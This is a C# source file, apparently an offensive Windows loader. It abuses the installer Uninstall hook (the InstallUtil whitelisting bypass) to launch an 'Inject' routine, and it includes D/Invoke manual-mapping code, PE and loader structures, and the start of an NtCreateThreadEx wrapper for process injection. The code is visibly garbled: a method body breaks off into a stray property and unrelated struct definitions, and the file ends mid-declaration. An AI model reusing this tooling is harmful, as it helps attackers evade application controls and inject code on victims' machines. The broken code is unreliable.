using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;
using System.Net;
using System.Reflection;

[Obfuscation(Exclude = false, Feature ="-rename,-constants")]
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Inject.Program.run(new string[]{});
    }
}

namespace Inject
{
    namespace DInvoke.ManualMap {
        public class Map
        {

            /// <summary>
            /// Maps a DLL from disk into a Section using NtCreateSection.
            /// </summary>
            /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
            /// <param name="DLLPath">Full path fo the DLL on disk.</param>
            /// <returns>PE.PE_MANUAL_MAP</returns>
            public static Data.PE.PE_MANUAL_MAP MapModuleFromDiskToSection(string DLLPath)
            {
                // Check file exists
                if (!File.Exists(DLLPath))
                {
                    throw new InvalidOperationException("Filepath not found.");
                }

                // Open file handle
                Data.Native.UNICODE_STRING ObjectName = new Data.Native.UNICODE_STRING();

                public string Section
                {
                    get { return new string(Name); }
                }
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_EXPORT_DIRECTORY
            {
                [FieldOffset(0)]
                public UInt32 Characteristics;
                [FieldOffset(4)]
                public UInt32 TimeDateStamp;
                [FieldOffset(8)]
                public UInt16 MajorVersion;
                [FieldOffset(10)]
                public UInt16 MinorVersion;
                [FieldOffset(12)]
                public UInt32 Name;
                [FieldOffset(16)]
                public UInt32 Base;
                [FieldOffset(20)]
                public UInt32 NumberOfFunctions;
                [FieldOffset(24)]
                public UInt32 NumberOfNames;
                [FieldOffset(28)]
                public UInt32 AddressOfFunctions;
                [FieldOffset(32)]
                public UInt32 AddressOfNames;
                [FieldOffset(36)]
                public UInt32 AddressOfOrdinals;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_BASE_RELOCATION
            {
                public uint VirtualAdress;
                public uint SizeOfBlock;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct PE_META_DATA
            {
                public UInt32 Pe;
                public Boolean Is32Bit;
                public IMAGE_FILE_HEADER ImageFileHeader;
                public IMAGE_OPTIONAL_HEADER32 OptHeader32;
                public IMAGE_OPTIONAL_HEADER64 OptHeader64;
                public IMAGE_SECTION_HEADER[] Sections;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct PE_MANUAL_MAP
            {
                public String DecoyModule;
                public IntPtr ModuleBase;
                public PE_META_DATA PEINFO;
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_THUNK_DATA32
            {
                [FieldOffset(0)]
                public UInt32 ForwarderString;
                [FieldOffset(0)]
                public UInt32 Function;
                [FieldOffset(0)]
                public UInt32 Ordinal;
                [FieldOffset(0)]
                public UInt32 AddressOfData;
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_THUNK_DATA64
            {
                [FieldOffset(0)]
                public UInt64 ForwarderString;
                [FieldOffset(0)]
                public UInt64 Function;
                [FieldOffset(0)]
                public UInt64 Ordinal;
                [FieldOffset(0)]
                public UInt64 AddressOfData;
            }

            // API_SET_NAMESPACE_ARRAY
            [StructLayout(LayoutKind.Explicit)]
            public struct ApiSetNamespace
            {
                [FieldOffset(0x0C)]
                public int Count;

                [FieldOffset(0x10)]
                public int EntryOffset;
            }

            // API_SET_NAMESPACE_ENTRY
            [StructLayout(LayoutKind.Explicit)]
            public struct ApiSetNamespaceEntry
            {
                [FieldOffset(0x04)]
                public int NameOffset;

                [FieldOffset(0x08)]
                public int NameLength;

                [FieldOffset(0x10)]
                public int ValueOffset;

                [FieldOffset(0x14)]
                public int ValueLength;
            }

            // API_SET_VALUE_ENTRY
            [StructLayout(LayoutKind.Explicit)]
            public struct ApiSetValueEntry
            {
                [FieldOffset(0x00)]
                public int Flags;

                [FieldOffset(0x04)]
                public int NameOffset;

                [FieldOffset(0x08)]
                public int NameCount;

                [FieldOffset(0x0C)]
                public int ValueOffset;

                [FieldOffset(0x10)]
                public int ValueCount;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct LDR_DATA_TABLE_ENTRY
            {
                public Data.Native.LIST_ENTRY InLoadOrderLinks;
                public Data.Native.LIST_ENTRY InMemoryOrderLinks;
                public Data.Native.LIST_ENTRY InInitializationOrderLinks;
                public IntPtr DllBase;
                public IntPtr EntryPoint;
                public UInt32 SizeOfImage;
                public Data.Native.UNICODE_STRING FullDllName;
                public Data.Native.UNICODE_STRING BaseDllName;
            }
        }//end class

    }

    namespace DInvoke.DynamicInvoke
    {

     public class Native
            {
                public static Data.Native.NTSTATUS NtCreateThreadEx(
                    ref IntPtr threadHandle,
                    Data.Win32.WinNT.ACCESS_MASK desiredAccess,
                    IntPtr objectAttributes,
